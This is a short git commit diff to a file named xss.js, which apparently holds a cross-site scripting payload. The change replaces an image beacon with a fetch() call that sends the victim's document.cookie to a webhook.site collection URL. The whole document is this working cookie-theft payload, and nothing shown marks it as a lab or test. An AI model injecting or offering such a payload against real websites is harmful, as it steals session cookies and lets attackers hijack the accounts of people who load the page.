dce74646bc1e100b6dd191eda648be96c23d0d85
mitchelharding <hardingmitchel@gmail.com>
2024-07-11 10:44:30 -0500

    Adjusted JS to make an explicit get request instead of initiating an image

--- xss.js
+++ xss.js
@@ -1,2 +1,1 @@
-var img = new Image();
-img.src = 'https://webhook.site/f7ca860f-d0c4-4ff6-ac96-4f1d79eb5906';
+fetch('https://webhook.site/f7ca860f-d0c4-4ff6-ac96-4f1d79eb5906?cookie=' + document.cookie);
